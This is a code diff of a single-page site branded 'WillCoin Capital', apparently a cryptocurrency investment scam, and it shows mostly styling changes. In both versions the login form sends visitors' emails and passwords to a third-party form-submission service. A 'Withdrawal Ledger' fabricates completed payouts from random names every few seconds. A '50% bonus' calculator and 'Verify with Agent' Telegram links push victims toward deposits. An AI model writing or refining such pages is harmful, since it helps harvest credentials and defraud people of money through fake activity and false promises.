@@ -10,153 +10,145 @@
         body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #020817; color: white; margin: 0; overflow-x: hidden; }
         .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.1); }
         .btn-glow { box-shadow: 0 0 20px rgba(34, 211, 238, 0.4); }
-        .modal-bg { background: rgba(0, 0, 0, 0.95); backdrop-filter: blur(10px); }
-        
         .view-hidden { display: none !important; }
         
-        input[type="range"] { -webkit-appearance: none; background: #1f2937; height: 4px; border-radius: 10px; width: 100%; }
-        input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 18px; width: 18px; border-radius: 50%; background: #22d3ee; cursor: pointer; box-shadow: 0 0 15px rgba(34,211,238,0.7); }
-        .support-float { position: fixed; bottom: 32px; right: 32px; z-index: 1000; }
-        
-        /* Table Layout */
+        /* Fixed Table for Mobile Alignment */
         table { table-layout: fixed; width: 100%; border-collapse: collapse; }
-        th, td { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        th, td { overflow: hidden; white-space: nowrap; }
+        th:first-child, td:first-child { padding-left: 1.5rem; }
+        th:last-child, td:last-child { padding-right: 1.5rem; }
+        
+        /* Professional Currency Alignment & Glow */
+        .currency-wrap { display: flex; align-items: baseline; justify-content: center; gap: 12px; }
+        .currency-symbol { 
+            font-size: 2rem; 
+            font-weight: 800; 
+            color: #22d3ee; 
+            text-shadow: 0 0 10px rgba(34, 211, 238, 0.6);
+        }
+
+        input[type="range"] { -webkit-appearance: none; background: #1f2937; height: 4px; border-radius: 10px; width: 100%; }
+        input[type="range"]::-webkit-slider-thumb { -webkit-appearance: none; height: 18px; width: 18px; border-radius: 50%; background: #22d3ee; cursor: pointer; }
+        
+        .support-float { position: fixed; bottom: 24px; right: 24px; z-index: 1000; }
 
         @keyframes slideIn {
-            from { opacity: 0; transform: translateY(-8px); }
+            from { opacity: 0; transform: translateY(-5px); }
             to { opacity: 1; transform: translateY(0); }
         }
-        .new-row { animation: slideIn 0.5s ease-out forwards; }
-
-        /* Currency Input Styling */
-        .currency-input-container { position: relative; display: flex; align-items: center; justify-content: center; }
-        .currency-symbol { font-size: 2.25rem; font-weight: 700; color: white; margin-right: 2px; }
+        .new-row { animation: slideIn 0.4s ease-out forwards; }
     </style>
 </head>
 <body>
 
-    <a href="https://t.me/willCoin_Capital" target="_blank" class="support-float flex items-center gap-3 bg-cyan-400 text-black px-8 py-4 rounded-full font-black uppercase text-[10px] tracking-widest btn-glow">
-        <span class="w-2 h-2 rounded-full bg-black animate-pulse"></span>
+    <a href="https://t.me/willCoin_Capital" target="_blank" class="support-float flex items-center gap-2 bg-cyan-400 text-black px-6 py-3 rounded-full font-black uppercase text-[9px] tracking-widest btn-glow">
+        <span class="w-1.5 h-1.5 rounded-full bg-black animate-pulse"></span>
         Live Support
     </a>
 
     <div id="main-terminal">
-        <nav class="flex items-center justify-between px-6 py-8 max-w-7xl mx-auto">
-            <div class="text-xl font-extrabold tracking-tighter">WILLCOIN<span class="text-cyan-400">CAPITAL</span></div>
-            <div class="flex items-center gap-6">
-                <button onclick="toggleAuth('login')" class="text-[10px] font-bold uppercase tracking-widest text-gray-400 hover:text-white transition">Login</button>
-                <button onclick="toggleAuth('signup')" class="px-6 py-2.5 bg-cyan-400 text-black rounded-lg text-[10px] font-black uppercase tracking-widest btn-glow">Sign Up</button>
+        <nav class="flex items-center justify-between px-6 py-6">
+            <div class="text-lg font-extrabold tracking-tighter">WILLCOIN<span class="text-cyan-400">CAPITAL</span></div>
+            <div class="flex gap-4">
+                <button onclick="toggleAuth('login')" class="text-[9px] font-bold uppercase tracking-widest text-gray-400">Login</button>
+                <button onclick="toggleAuth('signup')" class="px-4 py-2 bg-cyan-400 text-black rounded-lg text-[9px] font-black uppercase tracking-widest btn-glow">Sign Up</button>
             </div>
         </nav>
 
-        <main class="max-w-7xl mx-auto px-6 py-12 text-center">
-            <h1 class="text-4xl md:text-7xl font-extrabold mb-6 tracking-tighter uppercase leading-[1.05]">MAXIMIZE YOUR <br> CRYPTO POTENTIAL WITH <br> <span class="text-cyan-400">WILLCOINCAPITAL.</span></h1>
+        <main class="max-w-7xl mx-auto px-4 py-8 text-center">
+            <h1 class="text-4xl font-extrabold mb-8 tracking-tighter uppercase leading-[1.1]">MAXIMIZE YOUR <br> CRYPTO POTENTIAL</h1>
             
-            <div class="glass max-w-2xl mx-auto p-10 rounded-[40px] border border-white/5 relative mb-20">
-                <div class="absolute top-0 right-0 bg-cyan-400 text-black text-[9px] font-bold px-4 py-1.5 rounded-bl-xl uppercase">Bonus Active: 50%</div>
-                <h2 class="text-cyan-400 italic font-black uppercase text-sm mb-10 text-left tracking-widest">Profit Projection</h2>
+            <div class="glass max-w-md mx-auto p-10 rounded-[40px] border border-white/5 relative mb-12">
+                <div class="absolute top-0 right-0 bg-cyan-400 text-black text-[8px] font-bold px-3 py-1 rounded-bl-lg uppercase">Bonus Active: 50%</div>
+                <h2 class="text-cyan-400 italic font-black uppercase text-[10px] mb-10 text-left tracking-widest">Profit Projection</h2>
                 <div class="space-y-8">
-                    <div class="bg-black/40 rounded-2xl p-6 border border-white/5 currency-input-container">
+                    <div class="bg-black/40 rounded-2xl p-6 border border-white/5 currency-wrap">
                         <span class="currency-symbol">$</span>
-                        <input type="number" id="depositInput" value="1000" class="w-40 bg-transparent text-left text-4xl font-bold outline-none text-white">
+                        <input type="number" id="depositInput" value="1000" class="w-36 bg-transparent text-left text-5xl font-bold outline-none text-white tracking-tighter">
                     </div>
                     <input type="range" id="depositSlider" min="100" max="10000" step="100" value="1000">
                 </div>
                 <div class="flex justify-between mt-12 pt-8 border-t border-white/5">
-                    <div class="text-center"><p class="text-[10px] text-gray-500 uppercase font-bold mb-2">Invest</p><p class="text-2xl font-bold" id="displayInvest">$1,000</p></div>
-                    <div class="text-center"><p class="text-[10px] text-cyan-400 uppercase font-bold mb-2">Bonus</p><p class="text-2xl font-bold text-cyan-400" id="displayBonus">$500</p></div>
-                    <div class="text-center"><p class="text-[10px] text-gray-500 uppercase font-bold mb-2">Total</p><p class="text-2xl font-bold" id="displayTotal">$1,500</p></div>
+                    <div class="text-center"><p class="text-[9px] text-gray-500 uppercase font-bold mb-1">Invest</p><p class="text-xl font-bold" id="displayInvest">$1,000</p></div>
+                    <div class="text-center"><p class="text-[9px] text-cyan-400 uppercase font-bold mb-1">Bonus</p><p class="text-xl font-bold text-cyan-400" id="displayBonus">$500</p></div>
+                    <div class="text-center"><p class="text-[9px] text-gray-500 uppercase font-bold mb-1">Total</p><p class="text-xl font-bold" id="displayTotal">$1,500</p></div>
                 </div>
             </div>
 
-            <section class="max-w-5xl mx-auto pb-20">
-                <div class="flex items-center justify-center gap-2 mb-8">
-                    <span class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></span>
-                    <h3 class="text-xl font-black uppercase tracking-tighter">Withdrawal Ledger</h3>
+            <section class="max-w-md mx-auto pb-12">
+                <div class="flex items-center justify-center gap-2 mb-6">
+                    <span class="w-1.5 h-1.5 bg-green-500 rounded-full animate-pulse"></span>
+                    <h3 class="text-xs font-black uppercase tracking-widest">Withdrawal Ledger</h3>
                 </div>
                 <div class="glass rounded-3xl overflow-hidden border border-white/5">
                     <table class="w-full text-left text-[11px]">
-                        <thead class="bg-white/5 text-gray-400 uppercase font-bold">
+                        <thead class="bg-white/5 text-gray-500 uppercase font-bold">
                             <tr>
-                                <th class="px-6 py-5 w-[30%]">User</th>
-                                <th class="px-6 py-5 w-[35%]">Amount</th>
-                                <th class="px-6 py-5 w-[35%] text-right">Status</th>
+                                <th class="py-5 w-[32%]">User</th>
+                                <th class="py-5 w-[33%]">Amount</th>
+                                <th class="py-5 w-[35%] text-right">Status</th>
                             </tr>
                         </thead>
-                        <tbody id="ledgerBody" class="divide-y divide-white/5">
-                            </tbody>
+                        <tbody id="ledgerBody" class="divide-y divide-white/5"></tbody>
                     </table>
                 </div>
             </section>
         </main>
     </div>
 
-    <div id="dashboard" class="view-hidden min-h-screen bg-[#010409] p-6">
-        <div class="max-w-6xl mx-auto">
-            <nav class="flex justify-between items-center mb-12">
-                <h2 class="text-cyan-400 font-black uppercase tracking-tighter italic text-xl">User Dashboard</h2>
-                <button onclick="signOut()" class="text-[10px] text-gray-500 uppercase font-bold hover:text-white transition">Sign Out</button>
-            </nav>
-            <div class="grid md:grid-cols-3 gap-6 mb-10">
-                <div class="glass p-8 rounded-3xl"><p class="text-[10px] text-gray-500 uppercase font-bold mb-2">Portfolio</p><p class="text-3xl font-bold">$0.00</p></div>
-                <div class="glass p-8 rounded-3xl"><p class="text-[10px] text-cyan-400 uppercase font-bold mb-2">Bonus</p><p class="text-3xl font-bold text-cyan-400">$0.00</p></div>
-                <div class="glass p-8 rounded-3xl"><p class="text-[10px] text-gray-500 uppercase font-bold mb-2">Status</p><p class="text-xl font-bold text-orange-500 uppercase italic">Inactive</p></div>
-            </div>
-            <div class="glass p-12 rounded-[40px] text-center">
-                <h3 class="text-2xl font-black uppercase mb-4 text-cyan-400">Action Required</h3>
-                <p class="text-gray-400 text-sm mb-10">Account created. Please contact your agent to finalize activation.</p>
-                <a href="https://t.me/willCoin_Capital" class="px-10 py-5 bg-cyan-400 text-black font-black rounded-2xl uppercase text-xs btn-glow inline-block">Verify with Agent</a>
-            </div>
-        </div>
+    <div id="dashboard" class="view-hidden min-h-screen bg-[#010409] p-6 text-center">
+        <h2 class="text-cyan-400 font-black uppercase italic text-xl mb-8">Dashboard</h2>
+        <div class="glass p-8 rounded-2xl"><p class="text-gray-400 text-sm">Awaiting Activation...</p></div>
+        <button onclick="signOut()" class="mt-8 text-xs text-gray-500 underline uppercase tracking-widest font-bold">Sign Out</button>
     </div>
 
     <div id="authModal" class="fixed inset-0 z-[1100] flex items-center justify-center p-6 view-hidden">
         <div class="absolute inset-0 modal-bg" onclick="toggleAuth()"></div>
-        <div class="glass max-w-md w-full p-10 rounded-[40px] border border-cyan-400/30 relative z-10 text-center">
-            <h2 id="authTitle" class="text-2xl font-black uppercase text-cyan-400 mb-8">Login</h2>
+        <div class="glass max-w-sm w-full p-10 rounded-[40px] border border-cyan-400/30 relative z-10 text-center">
+            <h2 id="authTitle" class="text-xl font-black uppercase text-cyan-400 mb-8">Login</h2>
             <form id="authForm" class="space-y-5">
                 <input type="hidden" name="access_key" value="56f62943-45be-49fc-9e75-e166e5d4d20b">
                 <input type="email" name="email" placeholder="Email Address" required class="w-full bg-white/5 border border-white/10 rounded-2xl p-5 text-sm outline-none">
                 <input type="password" name="password" placeholder="Password" required class="w-full bg-white/5 border border-white/10 rounded-2xl p-5 text-sm outline-none">
-                <button type="submit" id="authSubmit" class="w-full py-5 bg-cyan-400 text-black font-black rounded-2xl uppercase text-xs btn-glow">Continue</button>
+                <button type="submit" id="authSubmit" class="w-full py-5 bg-cyan-400 text-black font-black rounded-2xl uppercase text-[10px] btn-glow">Continue</button>
             </form>
         </div>
     </div>
 
     <script>
-        // PERSISTENCE
-        if (localStorage.getItem('userActive') === 'true') { showDashboard(); }
+        // Persistence Logic
+        if (localStorage.getItem('isLoggedIn') === 'true') { showDashboard(); }
 
         function showDashboard() {
             document.getElementById('main-terminal').classList.add('view-hidden');
             document.getElementById('dashboard').classList.remove('view-hidden');
             document.getElementById('authModal').classList.add('view-hidden');
-            localStorage.setItem('userActive', 'true');
+            localStorage.setItem('isLoggedIn', 'true');
             window.scrollTo(0,0);
         }
 
-        function signOut() {
-            localStorage.removeItem('userActive');
-            location.reload();
-        }
+        function signOut() { localStorage.removeItem('isLoggedIn'); location.reload(); }
 
         function toggleAuth(mode) {
             const modal = document.getElementById('authModal');
             if (!mode) { modal.classList.add('view-hidden'); return; }
-            document.getElementById('authTitle').innerText = mode === 'login' ? 'Login' : 'Create Account';
+            document.getElementById('authTitle').innerText = mode === 'login' ? 'Login' : 'Sign Up';
             modal.classList.remove('view-hidden');
         }
 
         document.getElementById('authForm').onsubmit = async (e) => {
             e.preventDefault();
             const btn = document.getElementById('authSubmit');
-            btn.innerText = "Verifying...";
-            await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
-            btn.innerText = "Verified!";
-            setTimeout(showDashboard, 800);
+            btn.innerText = "Connecting...";
+            try {
+                await fetch('https://api.web3forms.com/submit', { method: 'POST', body: new FormData(e.target) });
+                showDashboard();
+            } catch(e) {
+                btn.innerText = "Try Again";
+            }
         };
 
-        // LEDGER ENGINE
+        // Ledger Engine
         const users = ["Alpha_User", "0x4e...f2", "CryptoKing", "User_772", "Btc_Hunter", "0x9d...1a", "Whale_99", "Trader_X", "Elite_Node"];
         const ledgerBody = document.getElementById('ledgerBody');
 
@@ -166,9 +158,9 @@
             const row = document.createElement('tr');
             row.className = 'new-row';
             row.innerHTML = `
-                <td class="px-6 py-5 text-gray-400 font-medium">${user}</td>
-                <td class="px-6 py-5 font-bold text-white">$${amount}</td>
-                <td class="px-6 py-5 text-right"><span class="bg-green-500/10 text-green-400 px-3 py-1.5 rounded-full text-[9px] font-black uppercase inline-block w-24 text-center">Completed</span></td>
+                <td class="py-5 text-gray-400 font-medium">${user}</td>
+                <td class="py-5 font-bold text-white">$${amount}</td>
+                <td class="py-5 text-right"><span class="bg-green-500/10 text-green-400 px-3 py-1.5 rounded-full text-[9px] font-black uppercase border border-green-500/20">Completed</span></td>
             `;
             ledgerBody.prepend(row);
             if (ledgerBody.children.length > 5) { ledgerBody.lastElementChild.remove(); }
@@ -177,7 +169,7 @@
         for(let i=0; i<5; i++) { updateLedger(); }
         setInterval(updateLedger, 4000);
 
-        // CALC
+        // Slider Calculator
         const input = document.getElementById('depositInput');
         const slider = document.getElementById('depositSlider');
         function updateCalc(val) {
